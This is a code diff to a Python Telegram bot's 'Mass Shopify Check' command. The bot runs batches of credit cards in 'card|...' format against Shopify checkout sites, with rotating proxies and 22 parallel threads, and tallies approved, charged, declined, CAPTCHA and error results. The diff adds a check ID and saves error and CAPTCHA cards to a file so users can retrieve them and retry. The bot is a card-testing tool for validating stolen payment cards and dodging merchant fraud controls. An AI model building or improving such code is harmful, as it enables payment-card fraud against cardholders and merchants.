@@ -21,6 +21,7 @@ from BOT.Charge.Shopify.slf.single import (
     MASS_DELAY_BETWEEN_CARDS,
 )
 from BOT.helper.start import load_users
+from BOT.helper.error_files import clear_error_file, save_error_ccs, generate_check_id, get_error_file_path
 from BOT.tools.proxy import get_rotating_proxy
 from BOT.helper.permissions import check_private_access
 from BOT.gc.credit import deduct_credit_bulk
@@ -337,14 +338,21 @@ async def mslf_handler(client, message):
             [InlineKeyboardButton("⏹ Stop Checking", callback_data=f"msh_stop_{user_id}")],
         ])
 
+        had_previous = get_error_file_path(user_id, "shopify") is not None
+        clear_error_file(user_id, "shopify")
+        check_id = generate_check_id()
+        error_ccs = []
+        cleaning_note = "\n<b>📎 Previous error file cleared.</b>" if had_previous else ""
+
         loader_msg = await message.reply(
             f"""<pre>◐ [#MSH] | Mass Shopify Check</pre>
 ━━━━━━━━━━━━━━━
+<b>[⚬] Check ID:</b> <code>{check_id}</code>
 <b>[⚬] Gateway:</b> <code>{gateway}</code>
 <b>[⚬] Cards:</b> <code>{card_count}</code>
 <b>[⚬] Sites:</b> <code>{site_count}</code>
 <b>[⚬] Mode:</b> <code>Parallel (22 threads) ⚡</code>
-<b>[⚬] Status:</b> <code>◐ Processing...</code>
+<b>[⚬] Status:</b> <code>◐ Processing...</code>{cleaning_note}
 ━━━━━━━━━━━━━
 <b>[⚬] Checked By:</b> {checked_by} [<code>{plan} {badge}</code>]""",
             reply_to_message_id=message.id,
@@ -435,7 +443,7 @@ async def mslf_handler(client, message):
         processed_count = 0
         total_retries = 0
         stopped = False
-        
+
         # Professional multi-threading: 22 threads with semaphore (Railway-optimized)
         MSH_CONCURRENCY = 22
         msh_semaphore = asyncio.Semaphore(MSH_CONCURRENCY)
@@ -456,6 +464,7 @@ async def mslf_handler(client, message):
                 sp = SPINNERS[processed_count % 4]
                 progress_text = f"""<pre>{sp} [#MSH] | Mass Shopify Check</pre>
 ━━━━━━━━━━━━━━━
+<b>[⚬] Check ID:</b> <code>{check_id}</code>
 <b>🟢 Total CC:</b> <code>{total_cc}</code>
 <b>💬 Progress:</b> <code>{processed_count}/{total_cc}</code>
 <b>✅ Approved:</b> <code>{approved_count}</code>
@@ -645,10 +654,13 @@ async def mslf_handler(client, message):
                     approved_count += 1
                 elif is_error:
                     error_count += 1
+                    error_ccs.append(card_used)
                 else:
                     declined_count += 1
                 if is_captcha:
                     captcha_count += 1
+                    if card_used not in error_ccs:
+                        error_ccs.append(card_used)
 
             if is_charged or is_approved:
                 cc_num = card_used.split("|")[0] if "|" in card_used else card_used
@@ -725,11 +737,22 @@ async def mslf_handler(client, message):
             count_to_deduct = processed_count if stopped else len(all_cards)
             await loop.run_in_executor(None, deduct_credit_bulk, user_id, count_to_deduct)
 
-        # Final completion response with statistics
+        # Save error+captcha CCs for /geterrors msh (use same check_id; shopify gate)
+        if error_ccs:
+            save_error_ccs(user_id, "shopify", error_ccs, check_id=check_id)
+        error_files_line = ""
+        if error_ccs:
+            error_files_line = (
+                f"\n📎 <b>To get error CCs file:</b> <code>/geterrors msh</code> (Check ID: <code>{check_id}</code>)\n"
+                "<b>📎 Error file stays</b> until you start a new <code>/msh</code> or <code>/tsh</code> check; then it is cleared.\n"
+            )
+
+        # Final completion response with statistics (check_id only in processing + completion)
         current_time = datetime.now().strftime("%I:%M %p")
         header = "<pre>⏹ Stopped by user</pre>" if stopped else "<pre>✦ CC Check Completed</pre>"
         completion_message = f"""{header}
 ━━━━━━━━━━━━━━━
+<b>[⚬] Check ID:</b> <code>{check_id}</code>
 🟢 <b>Total CC</b>     : <code>{total_cc}</code>
 💬 <b>Progress</b>    : <code>{processed_count}/{total_cc}</code>
 ✅ <b>Approved</b>    : <code>{approved_count}</code>
@@ -738,11 +761,11 @@ async def mslf_handler(client, message):
 ⚠️ <b>Errors</b>      : <code>{error_count}</code>
 ⚠️ <b>CAPTCHA</b>     : <code>{captcha_count}</code>
 🔄 <b>Rotations</b>   : <code>{total_retries}</code>
-━━━━━━━━━━━━━━━
+━━━━━━━━━━━━━
 ⏱️ <b>Time</b> : <code>{timetaken}s</code> · <code>{rate_final:.1f} cc/s</code>
 👤 <b>Checked By</b> : {checked_by} [<code>{plan} {badge}</code>]
 🔧 <b>Dev</b>: <a href="https://t.me/Chr1shtopher">Chr1shtopher</a> <code>{current_time}</code>
-━━━━━━━━━━━━━━━"""
+{error_files_line}━━━━━━━━━━━━━━━"""
 
         try:
             await loader_msg.edit(
